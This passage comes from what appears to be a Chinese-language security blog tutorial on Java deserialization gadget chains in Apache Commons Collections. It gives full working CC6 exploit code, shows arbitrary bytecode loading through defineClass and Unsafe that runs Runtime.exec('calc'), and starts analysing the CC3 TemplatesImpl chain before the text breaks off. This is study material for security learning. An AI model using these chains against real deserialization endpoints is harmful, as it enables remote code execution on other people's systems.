java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC6</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;Object,Object&gt; lazymap = LazyMap.decorate(map,chainedTransformer);</span><br><span class="line">        TiedMapEntry tiedMapEntry=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazymap, <span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(tiedMapEntry,<span class="string">&quot;bbb&quot;</span>);</span><br><span class="line">        map.remove(<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">       <span class="comment">// serialize(hashMap);</span></span><br><span class="line">        <span class="comment">//unserialize(&quot;ser.bin&quot;);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ObjectInputStream ois=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        Object obj=ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可是这里即使不进行序列化反序列化依旧会弹出计算器</p><p>问题就出在了hashmap.put</p><p>在我们还没进行序列化操作的时候进行了put操作,它调用hash方法, 并且传入的参数也是我们的利用代码, 自然会弹出计算器, </p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240330231133198.png" alt="image-20240330231133198"></p><p>因此, 我们应该避免以上情况, 我们可以先put一个无用的值进去, put结束后再通过反射将其改为我们的利用代码</p><p>转到LazyMap, 这里的factory, 也就是我们传入chainedTransformer的参数, 我们可以反射更改这个常量</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240330231902285.png" alt="image-20240330231902285"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC6</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;Object,Object&gt; lazymap = LazyMap.decorate(map,<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line">        TiedMapEntry tiedMapEntry=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazymap, <span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(tiedMapEntry,<span class="string">&quot;bbb&quot;</span>);</span><br><span class="line">        map.remove(<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">factory</span> <span class="operator">=</span> LazyMap.class.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        factory.set(lazymap,chainedTransformer);</span><br><span class="line">        serialize(hashMap);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ObjectInputStream ois=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        Object obj=ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>成功执行, 结束</p><h1 id="CC3"><a href="#CC3" class="headerlink" title="CC3"></a>CC3</h1><p>CC3就和CC1、CC6不同了，后者是执行命令，而前者是通过动态加载类，然后实例化类达到执行静态代码块的目的</p><p>因此我们先来复习一下类的动态加载和双亲委派机制</p><h2 id="类的动态加载"><a href="#类的动态加载" class="headerlink" title="类的动态加载"></a>类的动态加载</h2><p>在此之前需要介绍2个代码块，<strong>静态代码块和构造代码块</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    system.out.printIn(<span class="string">&quot;构造代码块&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> &#123;</span><br><span class="line"> system.out.printIn(<span class="string">&quot;静态代码块&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在类进行__初始化__的时候, __静态代码块__会被执行</p><p>在类进行__实例化__的时候，__构造代码块和构造函数和静态代码块__一并执行</p><p>例:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;构造代码块&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;静态代码块&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;无参构造方法&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String word)</span> &#123;</span><br><span class="line">        System.out.println(word);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> id;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Person&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;id=&quot;</span> + id +</span><br><span class="line">                <span class="string">&quot;, age=&quot;</span> + age +</span><br><span class="line">                <span class="string">&quot;, name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setId</span><span class="params">(<span class="type">int</span> id)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getId</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>加载类并默认进行初始化:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">          <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.example.Person&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240510222635510.png" alt="image-20240510222635510"></p><p>加载类但不初始化:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        ClassLoader c1=ClassLoader.getSystemClassLoader();</span><br><span class="line">        Class.forName(<span class="string">&quot;org.example.Person&quot;</span>,<span class="literal">false</span>,c1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240510223610815.png" alt="image-20240510223610815"></p><p>实例化:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">          <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240510222941281.png" alt="image-20240510222941281"></p><h2 id="双亲委派机制"><a href="#双亲委派机制" class="headerlink" title="双亲委派机制"></a>双亲委派机制</h2><blockquote><p>所谓的双亲委派机制，指的就是：<strong>当一个类加载器收到了类加载的请求的时候，他不会直接去加载指定的类，而是把这个请求委托给自己的父加载器去加载。只有父加载器无法加载这个类的时候，才会由当前这个加载器来负责类的加载。</strong><br>那么，什么情况下父加载器会无法加载某一个类呢？<br>其实，Java中提供的这四种类型的加载器，是有各自的职责的：</p><ul><li>Bootstrap ClassLoader ，主要负责加载Java核心类库，%JRE_HOME%\lib下的rt.jar、resources.jar、charsets.jar和class等。</li><li>Extention ClassLoader，主要负责加载目录%JRE_HOME%\lib\ext目录下的jar包和class文件。</li><li>Application ClassLoader ，主要负责加载当前应用的classpath下的所有类</li><li>User ClassLoader ， 用户自定义的类加载器,可加载指定路径的class文件</li></ul></blockquote><h2 id="URLclassLoader任意类加载"><a href="#URLclassLoader任意类加载" class="headerlink" title="URLclassLoader任意类加载"></a>URLclassLoader任意类加载</h2><p>这个类里面还有一个loadclass方法，可以通过URL加载类</p><h2 id="ClassLoader加载字节码执行命令"><a href="#ClassLoader加载字节码执行命令" class="headerlink" title="ClassLoader加载字节码执行命令"></a>ClassLoader加载字节码执行命令</h2><p>通过跟进调试双亲委派机制, 我们发现最终是<code>Classloader.defineClass</code>加载字节码来加载类, 那么, 就可以反射获取<code>defineClass</code>来直接加载任意类</p><p>生成目标类字节码文件:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hello</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>反射加载类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchMethodException, IOException, InvocationTargetException, IllegalAccessException, InstantiationException &#123;</span><br><span class="line">        Method defineclass=ClassLoader.class.getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>, String.class, <span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">int</span>.class);</span><br><span class="line">        defineclass.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">byte</span>[] words = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\Code\\Java-code\\CC1\\target\\classes\\org\\example\\Hello.class&quot;</span>));</span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">c</span> <span class="operator">=</span> ClassLoader.getSystemClassLoader();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">hello</span> <span class="operator">=</span> (Class) defineclass.invoke(c, <span class="string">&quot;org.example.Hello&quot;</span>, words, <span class="number">0</span>, words.length);</span><br><span class="line">        hello.newInstance();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240511204156647.png" alt="image-20240511204156647"></p><h2 id="Unsafe加载字节码"><a href="#Unsafe加载字节码" class="headerlink" title="Unsafe加载字节码"></a>Unsafe加载字节码</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sun.misc.Unsafe;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, IllegalAccessException, InstantiationException, NoSuchFieldException &#123;</span><br><span class="line">        <span class="type">byte</span>[] words = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\Code\\Java-code\\CC1\\target\\classes\\org\\example\\Hello.class&quot;</span>));</span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">c</span> <span class="operator">=</span> ClassLoader.getSystemClassLoader();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> Unsafe.class.getDeclaredField(<span class="string">&quot;theUnsafe&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Unsafe</span> <span class="variable">unsafe</span> <span class="operator">=</span> (Unsafe) f.get(<span class="literal">null</span>);</span><br><span class="line">        Class&lt;?&gt; hello = unsafe.defineClass(<span class="string">&quot;org.example.Hello&quot;</span>, words, <span class="number">0</span>, words.length, c, <span class="literal">null</span>);</span><br><span class="line">        hello.newInstance();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这次我获取的是unsafe的属性，而不是<code>defineClass</code>方法，同样的unsafe类也有definclass方法，但是他是原生的类（底层C加载），因此反射过来无法调用, 因此我们需要先获取Unsafe对象，进而调用definclass方法，最后加载任意类从而实现命令执行</p><h2 id="链子分析-2"><a href="#链子分析-2" class="headerlink" title="链子分析"></a>链子分析</h2><p>CC3采用的是动态加载类，也就是上面讲基础时用到过的<code>ClassLoder.defineclass</code>,因此我们寻找谁调用了defineclass方法</p><p>在java核心库中, 在com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.TransletClassLoader里调用了:</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240511222124553.png" alt="image-20240511222124553"></p><p>继续跟进, 看看该类的哪里调用了defineclass</p><p>在<code>defineTransletClasses</code>中</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240511222341863.png" alt="image-20240511222341863"></p><p>可以看见这里有调用, 但是必须绕过第一个判断, 我们翻上去看<code>_bytecodes</code>的默认值就是null, 因此需要反射赋值, 否则是无法执行到defineclass的</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240511222952049.png" alt="image-20240511222952049"></p><p>这里调用<code>_tfactory.getExternalExtensionsMap()</code>, 因此<code>_tfactory</code>也不能为空</p><p>不过好在在readObject中<code>_tfactory</code>会被自动赋值, 因此我们不必关心</p><p>继续看哪里调用了<code>defineTransletClasses</code></p><p>当前类中能够搜索到三处调用,  我们只关心<code>getTransletInstance</code></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240511223533379.png" alt="image-20240511223533379"></p><p>这里的if判断依然是需要反射赋值,</p><p>继续跟进哪里调用了<code>getTransletInstance</code></p><p>只有一个<code>newTransformer</code>对其进行了调用</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240511223717794.png" alt="image-20240511223717794"></p><p>至此, 现在的思路就是实例化一个<code>TemplatesImpl</code>,然后调用它的<code>newTransformer</code>方法, 以此来达到加载任意类的目的</p><p>编写demo</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> 